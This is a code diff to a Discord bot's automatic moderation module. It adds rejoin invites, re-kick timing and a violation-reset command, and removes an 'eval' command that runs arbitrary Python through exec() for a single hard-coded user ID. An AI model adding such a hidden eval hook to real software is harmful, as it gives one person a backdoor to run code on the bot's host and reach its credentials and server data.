@@ -25,7 +25,9 @@ class AutoMod(commands.Cog):
             "maxviolations": 3,
             "mute_role": None,
             "imagemode": [],
-            "muted_users": {}
+            "muted_users": {},
+            "invite_channel": None,
+            "kicked_users": {},
         }
         default_member = {
             "times_violated": 0,
@@ -40,29 +42,6 @@ class AutoMod(commands.Cog):
         self.amount_of_time = 5
         self.warning_timeout = 180
 
-
-    @commands.command(aliases=["eval"])
-    async def parse(self, ctx):
-        if ctx.author.id == 180325351392673794:
-            code = ctx.message.content[8:]
-            code = "    " + code.replace("\n", "\n    ")
-            code = "async def __eval_function__():\n" + code
-
-            additional = {}
-            additional["self"] = self
-            additional["ctx"] = ctx
-            additional["channel"] = ctx.channel
-            additional["author"] = ctx.author
-            additional["server"] = ctx.guild
-
-            try:
-                exec(code, {**globals(), **additional}, locals())
-
-                await locals()["__eval_function__"]()
-            except Exception as e:
-                embed=discord.Embed(description=str(e),colour=0xff4500)
-                await ctx.send(embed=embed)
-
     @commands.guild_only()
     @checks.has_permissions(administrator=True)
     @commands.group(name="automod")
@@ -71,11 +50,24 @@ class AutoMod(commands.Cog):
         if ctx.invoked_subcommand is None:
             pass
 
+    @automod_.command(name="resetuser")
+    async def _resetuser(self, ctx, *, user: discord.Member):
+        """Reset violations for a user."""
+        await self.data.member(user).times_violated.set(0)
+        await self.data.member(user).muted.set(False)
+        await ctx.send(f"Violations for **{user.name}** has been reset!")
+
     @automod_.command(name="logchannel")
     async def _logchannel(self, ctx, *, channel: discord.TextChannel):
         """Setup a moderation log channel."""
         await self.data.guild(ctx.guild).log_channel.set(channel.id)
         await ctx.send(f"Set the auto moderation log channel to {channel.mention}.")
+
+    @automod_.command(name="invitechannel")
+    async def _invitechannel(self, ctx, *, channel: discord.TextChannel):
+        """Set a channel, for which bot will create invites."""
+        await self.data.guild(ctx.guild).invite_channel.set(channel.id)
+        await ctx.send(f"Set the invite channel to {channel.mention}.")
 
     @automod_.command(name="whitelistrole")
     async def _whitelistrole(self, ctx, *, role: discord.Role):
@@ -403,7 +395,7 @@ class AutoMod(commands.Cog):
                 await self.data.member(user).muted.set(False)
                 return
 
-            if user.top_role.position >= self.bot.user.top_role.position:
+            if user.top_role.position >= user.guild.get_member(self.bot.user.id).top_role.position:
                 if log_channel:
                     try:
                         await log_channel.send(f"Failed to kick {user.mention} - ``{user.id}`` for triggering **{reason}** system.")
@@ -415,8 +407,27 @@ class AutoMod(commands.Cog):
                 await self.data.member(user).muted.set(False)
                 return
 
+            invite_channel = await self.data.guild(user.guild).invite_channel()
+            invite = None
+            if invite_channel:
+                try:
+                    invite_channel =user.guild.get_channel(int(invite_channel))
+                except:
+                    pass
+
+                if invite_channel:
+                    invite = await invite_channel.create_invite(max_age=0, max_uses=1, unique=True, reason="Auto-Mod")
+
             try:
-                await user.send(f"You have been kicked from {user.guild.name} due to {reason}.")
+                if invite:
+                    await user.send(f"You have been kicked from {user.guild.name} due to {reason}.\n\n You can join back after 10 minutes using the following invite: {invite} ")
+                else:
+                    await user.send(f"You have been kicked from {user.guild.name} due to {reason}.")
+
+                users_kicked_invites = await self.data.guild(user.guild).kicked_users()
+                if str(user.id) not in users_kicked_invites:
+                    await self.data.guild(user.guild).kicked_users.set_raw(user.id, value=datetime.datetime.utcnow().timestamp())
+
             except discord.HTTPException:
                 pass
             except discord.Forbidden:
@@ -431,7 +442,10 @@ class AutoMod(commands.Cog):
 
             if log_channel:
                 try:
-                    await log_channel.send(f"{user.mention} - ``{user.id}`` has been kicked from the server for triggering **{reason}** system.")
+                    if invite:
+                        await log_channel.send(f"{user.mention} - ``{user.id}`` has been kicked from the server for triggering **{reason}** system.\n\n User was sent a temporary invite link to rejoin: {invite}")
+                    else:
+                        await log_channel.send(f"{user.mention} - ``{user.id}`` has been kicked from the server for triggering **{reason}** system.")
                 except discord.HTTPException:
                     pass
                 except discord.Forbidden:
@@ -458,7 +472,6 @@ class AutoMod(commands.Cog):
                     await log_channel.send(f"{user.mention} - ``{user.id}`` Has been warned for triggering **{reason}** system.")
                 except:
                     pass
-
 
     async def unmute_user_loop(self):
         while True:
@@ -656,6 +669,37 @@ class AutoMod(commands.Cog):
                     await message.author.send("You can only attach images or gifs in this channel.")
                 except:
                     pass
+
+    @commands.Cog.listener()
+    async def on_member_join(self, member):
+        users_kicked_invites = await self.data.guild(member.guild).kicked_users()
+        if str(member.id) in users_kicked_invites:
+            if datetime.datetime.utcnow().timestamp() - users_kicked_invites[str(member.id)] >= 600:
+                await self.data.guild(member.guild).kicked_users.clear_raw(member.id)
+            elif datetime.datetime.utcnow().timestamp() - users_kicked_invites[str(member.id)] < 600:
+                try:
+                    invite_channel = await self.data.guild(member.guild).invite_channel()
+                    invite = None
+                    if invite_channel:
+                        try:
+                            invite_channel =member.guild.get_channel(int(invite_channel))
+                        except:
+                            pass
+
+                        if invite_channel:
+                            invite = await invite_channel.create_invite(max_age=0, max_uses=1, unique=True, reason="Auto-Mod")
+                    if invite:
+                        await member.send(f"You can only join back after 10 minutes of the initial kick time.\n\n New Invite Link: {invite}")
+                    else:
+                        await member.send(f"You can only join back after 10 minutes of the initial kick time.\n\n Please ask a mod for a valid invite link.")
+                except:
+                    pass
+
+                try:
+                    await member.kick()
+                except:
+                    pass
+
 
 
     async def spoilers_check(self, message):
